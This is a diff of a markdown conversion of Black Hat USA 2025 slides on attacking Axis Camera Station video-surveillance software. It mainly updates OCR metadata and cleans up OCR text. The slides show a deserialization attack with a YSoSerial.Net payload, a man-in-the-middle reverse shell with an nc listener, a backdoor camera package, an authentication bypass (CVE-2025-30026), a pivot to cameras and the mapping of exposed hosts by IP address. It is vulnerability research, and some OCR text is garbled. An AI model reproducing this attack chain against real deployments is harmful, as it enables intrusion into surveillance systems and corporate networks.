@@ -8,13 +8,18 @@ year: 2025
 source_pdf: "BlackHat_USA_2025_Slides/Noam Moshe_Turning Camera Surveillance on its Axis.pdf"
 pages: 68
 sha256: "31dd5e8365b634b2f788427bf92b379f61c553cc751c64b47b363e117074bb35"
-text_chars: 17990
-ocr_pages: 28
+text_chars: 15015
+ocr_pages: 23
 has_ocr: true
 redacted_secrets: 0
+ocr_confidence: 88.7
+ocr_unreliable_blocks: 0
+vision_verified_blocks: 2
+ocr_timeouts: 0
+pages_recovered_from_text_layer: 0
 companion_files: []
 extractor: "pymupdf4llm 1.28.2 + tesseract"
-converted_at: "2026-08-11T22:58:49Z"
+converted_at: "2026-08-12T05:18:00Z"
 ---
 # Turning Camera Surveillance on its Axis
 
@@ -22,13 +27,15 @@ converted_at: "2026-08-11T22:58:49Z"
 **Conference:** Black Hat USA 2025  
 **Source:** `BlackHat_USA_2025_Slides/Noam Moshe_Turning Camera Surveillance on its Axis.pdf` (68 pages)
 
+
 ## Slide 1
 
 ## **Turning Camera Surveillance on its Axis**
 
 **Noam Moshe Claroty Research, Claroty Team82**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 93/100 on the text kept, 93/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 CLAROTY
@@ -49,7 +56,8 @@ Claroty Research, Claroty Team82
 
 **I want to hack** **_Big Company Inc._**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 90/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 | want to hack Big Company Inc.
@@ -59,12 +67,7 @@ Closed: 3 Jul, 16:59 GMT-4 + Disclaimer
 After hours 180.54 —
 181.(
 180.16 USD 09:35
-°
 180.0 4
-179.5 :\ A i
-aie) Sy Au Sane
-se lee
-179. VJ
 178
 11:00
 Open 179.82
@@ -87,53 +90,51 @@ Qtrly Div Amt
 
 - What is **axis.remoting protocol** ?
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Read by a vision model from the page image (replacing unreliable OCR) — confidence 89/100 on the text kept, 81/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**
 
 ```text
 But how?
-¢ Searched for exposed services
-¢ Found an interesting service
-¢ What is axis.remoting protocol ?
-Certificate
-Fingerprint
-Subject
-Issuer
-Names
-43c053f29be29b1811c4e48a2872ed1c5
-CN=DESKTOP-3FH7UIS5.axis.remoting
-CN=DESKTOP-3FH7UIS5.axis.remoting
-DESKTOP-3FH7UI5.axis.remoting
-HTTP 55756/TCP 07/05/2025 08:54 UTC
-rs
-(2B Microsoft Windows (7
-GW Microsoft HTTP API 2.0 (7
+
+• Searched for exposed services
+• Found an interesting service
+• What is axis.remoting protocol ?
+
+[right-hand scan result panel]
+HTTP 55756/TCP                                        07/05/2025 08:54 UTC
+
+Software                                        VIEW ALL DATA      ➜ GO
+  🔍 Microsoft Windows ↗
+  🔍 Microsoft HTTP API 2.0 ↗
+
+Details
 https://184.176.222.218:55756/
-Status
-Body Hash
-HTML Title
-Response Body
+                Status  404  Not Found
+             Body Hash  sha1:a66898b36c94c53766e66c1a7aaeb149447ec083
+            HTML Title  Not Found
+         Response Body  EXPAND
+
+TLS
 Handshake
-Version Selected
-Cipher Selected
+      Version Selected  TLSv1_2
+       Cipher Selected  TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384
+
 Certificate
+           Fingerprint  43c053f29be29b1811c4e48a2872ed1c5e27b9bb2c89f3b3e8d679cc64867f0a
+               Subject  CN=DESKTOP-3FH7UI5.axis.remoting
+                Issuer  CN=DESKTOP-3FH7UI5.axis.remoting
+                 Names  DESKTOP-3FH7UI5.axis.remoting
+
 Fingerprint
-Subject
-Issuer
-Names
-Fingerprint
-JARM
-JA3S
-404 Not Found
-shal: a66898b36c94c53766e66c1la7aaeb149447ec083
-Not Found
-TLSv1_2
-TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384
-43c053f29be29b1811c4e48a2872ed1c5e27b9bb2c89F3b3e8d679cc64867 fea
-CN=DESKTOP-3FH7UI5.axis.remoting
-CN=DESKTOP-3FH7UI5.axis.remoting
-DESKTOP-3FH7UIS.axis.remoting
-2ad2ad16d00000022c2ad2ad2ad2ad46ff59a659b30fd8aeaa6755c67691b4
-364ff1 4b04ef93c3b4cfa429d729c0d9
+                  JARM  2ad2ad16d00000022c2ad2ad2ad2ad46ff59a659b30fd8aeaa6755c67691b4
+                  JA3S  364ff14b04ef93c3b4cfa429d729c0d9
+
+[zoomed callout box, lower left]
+Certificate
+   Fingerprint  43c053f29be29b1811c4e48a2872ed1c5 (cut off at box edge)
+       Subject  CN=DESKTOP-3FH7UI5.axis.remoting   (".axis.remoting" underlined in red)
+        Issuer  CN=DESKTOP-3FH7UI5.axis.remoting
+         Names  DESKTOP-3FH7UI5.axis.remoting
 ```
 
 ## Slide 5
@@ -154,13 +155,6 @@ DESKTOP-3FH7UIS.axis.remoting
 
 **Most companies have more than 1 camera…**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-M a
-ost companies have more than 1 camera...
-```
-
 ## Slide 7
 
 #### **Axis Camera Station / Device Manager**
@@ -173,7 +167,8 @@ Axis
 Camera
 Station
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 94/100 on the text kept, 94/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Axis Camera Station / Device Manager
@@ -213,10 +208,10 @@ Axis
 Camera
 Station
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 86/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-Ax _
 is Camera Station 7 Device Manager
 ¢ Live feed view and video
 recording AXIS a
@@ -275,18 +270,6 @@ Big
 Company
 Inc.
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-On-Prem Connection
-ioe
-Axis Camera ae =)
-Station Clients pts, ———
-Big
-Company
-Inc.
-```
-
 ## Slide 13
 
 #### **On-Prem Connection**
@@ -294,22 +277,6 @@ Inc.
 **Axis Camera Station Clients WAN Attacker**
 
 **Big Company Inc.**
-
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-O _
-n-Prem Connection
-ioe
-Axis Camera \,
-Station Clients os me
-, f
-,
-o Big
-\o [L-- Company
-— Inc.
-Attacker
-```
 
 ## Slide 14
 
@@ -396,16 +363,15 @@ Station
 
 **What happens when we have a complicated function?**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 91/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 What happens when we have a complicated function?
-ace WindowsClientApi.Common. Remoting
 [ServiceContract]
 {
 Task<LogOnDto> LogOnAsync(Uri uri, ClientInformationDto clientInformationDto, CommunicationType communicationType,
 T ct);
-JO LISEL LL
 Task LogOffAsync(ServerIdDto serverId,
 Task LogOff2Async(Uri uri,
 ```
@@ -414,15 +380,13 @@ Task LogOff2Async(Uri uri,
 
 **What happens when we have a complicated function?**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 91/100 on the text kept, 73/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 What happens when we have a complicated function?
-sace WindowsClientApi.Common. Remoting
 [ServiceContract]
 Task<LogOnDto> LogOnAsync(Uri uri, ClientInformationDto clientInformationDto, CommunicationType communicationType,
-ct)
-ck ceore CLientInformationDto clientIinformationDto,
 Task LogOff2Async(Uri uri, t ct):
 }
 }
@@ -432,17 +396,16 @@ Task LogOff2Async(Uri uri, t ct):
 
 **What happens when we have a complicated function?**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 90/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 What happens when we have a complicated function?
 ClientinformationDto clientiInformationDto,
 namespace WinddéwsClientApi .Common. Remoting
 {
-[ZataContract]
 publi lass ClientInformationDto : Dto
 {
-¢ > 4 7 bYU LI c RIL Wat RV A OxXYUUULYOAYUS Lie UTTset OUXVUUUEL 5
 public ClientInformationDto(string machineName, string machineWindowsUserName, string machineWindowsUserSid, string
 preferredLanguage)
 {
@@ -465,26 +428,20 @@ this. = preferredLanguage;
 
 **Example Request**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 80/100 on the text kept, 66/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Example Request
 CLIENT --> SERVER DATA:
-aa3{
 "Request": {
 "Id": "fY¥pAWaAoNNf9",
 "Service": "SessionFacade",
 "Method": "LogOnAsync",
 "Parameters": {
-"uri": "net.tcp:// Rese eT eit
-"clientInfarmationuio -_«
 "$type": welindowsClientApi Common. Remoting. ClientInformationDto, WindowsClientApi",
-“MachinewindowsUserName”: “DESKIUOP- :
-"MachineWindowsUserSid": " jig
 "MachineName": "DESKTOP- wy
 "PreferredLanguage": "en",
-"ServerId": "00000000-0000-0000-0000-000000000000"
-Sar
 "communicationType": 1,
 "ct": “audcKz4EZann"
 ```
@@ -569,42 +526,29 @@ Station
 
 ## Slide 34
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 92/100 on the text kept, 50/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 YSoSerial.Net
 CLIENT --> SERVER DATA:
 Modified request:
-saat
-"Data = 4
-"Ysaliua": £
 "$type": "System.Security.Principal.WindowsIdentity, mscorlib, Version=4.0.0.0, Culture=neutral,
-Publicney!1oken=p//a5C501YS54eU5y",
 "System.Security.ClaimsIdentity.actor":
-"AAEAAAD/ ////AQAAAAAAAAAMAgZAAAF5NaWNyb3NvZnQuUG93ZXJTaGVsbC5FZG10b3IsIFZ1cnNpb249My4wL j AuUMCwgQ3VsdHVyZT1
-2t1bj0ZMWJmMzg1NmFkMzY0OZTM1BQEAAABCTW1 j cm9zb2Z0L1Zpc3VhbFNOdWRpby5UZXhOLkZvcm1hdHRpbmcuVGV4dEZvcm1hdHRpb
-Gb3J1Z3JvdW5kQnJ1c2gBAgAAAAYDAAAAt gU8P3htbCB2ZXJ zaw9uPSIxLjAilGVuY29kaW5nPSJ1dGYtMTYiPz4NCj xPYmp 1LY3REYXR
-TOiU3RhcnQiIE1ZSW5pdG1lhbExvYWRFbmFibGVkPSJGYWxzZSIgeG1sbnM9 ImhOdHA6Ly9zY2h1bWFzLm1 pY3Jvc29mdC5jb20vd21uzZ
--hdGlvbilgeG1sbnM6c2Q9ImNscituYw1 lc3BhY2U6U31zdGVtLkRpYWdub3NOaWNz02Fzc2VtYmx5PVN5c3R1bSIgeG1sbnM6eD0iaHR
-2ZO0LmNvbS93 aW5SmeC8yMDA2L3hhbWwiP gOKICA8T2jJqZWNORGFOYVByb3ZpZGVyLk9iamV jdEluc3RhbmN1PgOKICAgIDxzZDpQcm9 jZ
-1c3MuU3RhcnRJIbmZvPg0KICAgICAgI CA8c2Q6UHJvY2Vzc1NOYXJOSWS5mbyBBcmd 1 bWVudHM91i9j1G1zcGFpbnQilFNOYWSkYXJkRX
-HOiTFNOYWSkYXJkT3VOCHVORW5j b2Rpbmc9Int40k51bGx9TiBVc2VyTmFtZTOiliBQYXNzd29yZD0ie3g6TnVsbHOiTERVbWFpbj0il
-hbHN1TiBGaWx1lTmFtZTOiY21kIiAvPgOKICAgI CAgPC9zZZDpQcm9 j ZXNZLINOYXJOSW5mbz4NCiAgICA8L3Nk01Byb2N1c3M+DQogID
-k9iamVjdEluc3RhbmN1Pg0KPC9PYmp1Y3REYXRhHUHJvdm1kZXI+Cw=="
 ```
 
 ## Slide 35
 
 **Step 4: Reverse Shell on Server!**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 83/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Step 4: Reverse Shell on Server!
 =| [a=] AcsService.exe NT AUTHORITY...
 conhost.exe NT AUTHORITY‘...
 mp (=| £9 powershell.exe NT AUTHORITY’...
-Gaw conhost.exe NT AUTHORITY‘...
 [root@LocaLhost axis]# python3 mitm_expLoit.py [root@Localhost axis]# nc -lvk 5050
 [+] Setting up MiTM listener! Ncat: Version 7.5@ ( https://nmap.org/ncat )
 [+] Received connection from client! forwarding to server|Ncat: Listening on :::505@
@@ -631,22 +575,12 @@ Resp
 Axis Camera
 Station
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-"Side Note -Wecan do the cametorthecten: i
-ide Note - We can do the same for the client!
-J} Ce
-Axis Camera
-Station Client
-CAWindows\System32\cmd.exe
-```
-
 ## Slide 37
 
 **Executing Code on Cameras (using legitimate features)**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 91/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Executing Code on
@@ -685,46 +619,50 @@ THERE'S MORE
 
 **Building a Package**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Read by a vision model from the page image (replacing unreliable OCR) — confidence 91/100 on the text kept, 89/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**
 
 ```text
 Building a Package
--arg ARCH=aarcho4 --tag mal-package .
-DEPRECATED: The Legacy builder is deprecated and will be removed in a future release.
-Install the buildx component to build images with BuildKit:
-https ://docs.docker .com/go/buiLdx/
-Sending build context to Docker daemon 132.6kB
+
+➜  hello-world git:(main) ✗ sudo docker build --build-arg ARCH=aarch64 --tag mal-package .
+
+DEPRECATED: The legacy builder is deprecated and will be removed in a future release.
+            Install the buildx component to build images with BuildKit:
+            https://docs.docker.com/go/buildx/
+
+Sending build context to Docker daemon  132.6kB
 Step 1/9 : ARG ARCH=armv7hf
 Step 2/9 : ARG VERSION=12.5.0
-Step 3/9 : ARG UBUNTU_VERSION=24. 04
+Step 3/9 : ARG UBUNTU_VERSION=24.04
 Step 4/9 : ARG REPO=axisecp
 Step 5/9 : ARG SDK=acap-native-sdk
-Step 6/9 : FROM ${REPO}/${SDK} : ${VERSION}-${ARCH}-ubuntu${UBUNTU_VERSION}
----> 160f8@e5e1dd
+Step 6/9 : FROM ${REPO}/${SDK}:${VERSION}-${ARCH}-ubuntu${UBUNTU_VERSION}
+ ---> 160f80e5e1dd
 Step 7/9 : COPY ./app /opt/app/
----> Using cache
----> 324679a4ae57
+ ---> Using cache
+ ---> 324679a4ae57
 Step 8/9 : WORKDIR /opt/app
----> Using cache
---> 748d8352b612
+ ---> Using cache
+ ---> 748d8352b612
 Step 9/9 : RUN . /opt/axis/acapsdk/environment-setup* && acap-build ./
----> Using cache
----> 913b2369a865
+ ---> Using cache
+ ---> 913b2369a865
 Successfully built 913b2369a865
-Successfully tagged mal-package: Latest
+Successfully tagged mal-package:latest
 ```
 
 ## Slide 41
 
 **Building a Package**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 86/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Building a Package
 Apps
 x ly Add app Find more apps Allow unsigned apps Allow root-privileged apps
-N
 @ AXIS Object Analytics
 Version: 1.12.28 Open
 Axis Communications
@@ -732,7 +670,8 @@ Axis Communications
 
 ## Slide 42
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 88/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 @ Backdoor Pacakge
@@ -740,7 +679,6 @@ Version: 1.0.0
 UNKNOWN
 Apps
 Allow unsigned apps Allow root-privileged apps
-+ Add app
 @ Backdoor Pacakge
 Version: 1.0.0 Open
 UNKNOWN
@@ -763,10 +701,10 @@ Accept: */*
 
 ###### **Let’s make it preauth**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 82/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-as
 MiTM != preauth
 Let's make it preauth
 } iis THIS’ AUTH BYPASS?
@@ -788,13 +726,13 @@ Let's make it preauth
 
 **Still requires auth**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 93/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Still requires auth
 <
 G
-D 127.0.0.1:55752
 Windows Security
 Sign in to access this site
 Authorization required by http://127.0.0.1:55752
@@ -807,18 +745,16 @@ OK Cancel
 
 ##### **If we use creds - browser is just stuck forever…**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 89/100 on the text kept, 68/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-S a
 till requires auth
 € G © 127.0.0.1:55752
 Windows Security x
 browser is just stuck
 — | forever...
 OK Cancel
- “ 127.0.0.1:55752 x ie
-& %*  @ 127.0.0.1:55752
 ```
 
 ## Slide 47
@@ -933,7 +869,8 @@ Station
 
 **Web Server Authentication Scheme**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 95/100 on the text kept, 95/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Web Server Authentication Scheme
@@ -949,17 +886,16 @@ NTLM is used.
 
 **Super Duper Secret Server Authentication Scheme (CVE-2025-30026)**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 84/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Super Duper Secret Server Authentication Scheme _
 (CVE-2025-30026)
-" yu.
 2
 ‘ring text = serverUri + "_
 HttpListener webServerAnonymous = new HttpListener();
 webServerAnonymous. = true;
-webServerAnonymous . = AuthenticationSchemes.
 webServerAnonymous . .Add(text) ;
 webServerAnonymous.Start();
 Anonymous 32768 Specifies anonymous authentication.
@@ -985,26 +921,21 @@ Anonymous 32768 Specifies anonymous authentication.
 
 **Axis Camera Station**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 81/100 on the text kept, 73/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-And Then - Pivot to Cameras! a me butld git (natn) # ne “Wk 5057
 Listening on 0.0.0.0 9092
 Connection received on
 echo AXIS Camera
 AXIS Camera
 7
 *
-ft
 —_
-_—,
 = =
-see, ee
-=~'s,
 lo] ~ . > build main) x nc -lvk 9092
 — \ Listening on @.0.0.@ 9092
 ail 3 . Connection received on
-~ a
 . “—_, echo AXIS Camera
 Axis Camera ; AXIS Camera
 Station
@@ -1055,7 +986,8 @@ This includes **Domain** !!
 
 **Mapping Targets**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 88/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Mapping Targets
@@ -1070,11 +1002,9 @@ Mapping Targets
 4
 1
 6
-‘a
 1
 8
 6
-1
 1
 7
 1
@@ -1099,7 +1029,6 @@ server_port ad_domain_name
 55
 55
 55
-ss)
 55
 5S
 55
@@ -1120,15 +1049,11 @@ ss)
 55
 55
 LE -P3
-Ss
-S
 MA 04
 RCC
 LE ‘2020
 AXISNVR-S
 EM A2
-fe) col
-\Wieeame_E
 AXISNVR-F
 SMCCAMSRV2022
 DI
@@ -1138,15 +1063,10 @@ SUPERIOR
 AXISNVR-
 DESKTOP.
 DVRA?
-"K-11
-CAMSRV.
 AXISNVR-
 AXISNVR-
-D
 server_name
-lt P32
 ERO1
-7£04
 01
 LBBC)
 AXISN
@@ -1158,78 +1078,57 @@ SMCCAMSRV2022
 D 022
 00
 AXISNVR-
-AXIS1
-AXISNVR-£
 DESKTOP-
 DVRAZ
 { -11
-s
 AXISNVR-E
 AXISNVR-C
 MS27
 BAREO1
 LMM_7
-ci7
 C1443
 E
 dns_domain_name
 Ler
-s
 SE
 t 04
 local
-L ‘2020
 AXISNVR-S
-E
-' 01
-local
 AXISNVR-
 SMCCAMSRV2022
-‘=com
 00
 AXISNVR-
 local
 AXISNVR-9
 DESKTOP-6
-DVRA2
 11
 AXISNVR-
 AXISNVR-
 Lenovo-P3
-as 01.
 SEF
 04
 -loca'
-12020
 AXISNVR-S
 AH
-cO1
 local
 AXISNVR-
 SMCCAM
 | 00
-AXISNVR-:
 axis1.s
 AXISNVR-£
-DESKTOP-1
 DVRA2
-11
 R
 AXISNVR-EJ
 AXISNVR-GI
 MS.
-Be 1.loca
 lo
-tal
 io
 3
 G
 parent_dns_domain
 None
-com
 None
 None
-‘local
 None
 None
 local
@@ -1247,7 +1146,6 @@ loca
 None
 tal
 io
-B
 None
 ```
 
@@ -1281,7 +1179,8 @@ None
 
 ©Copyright Claroty. All rights reserved
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 94/100 on the text kept, 94/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Thank you
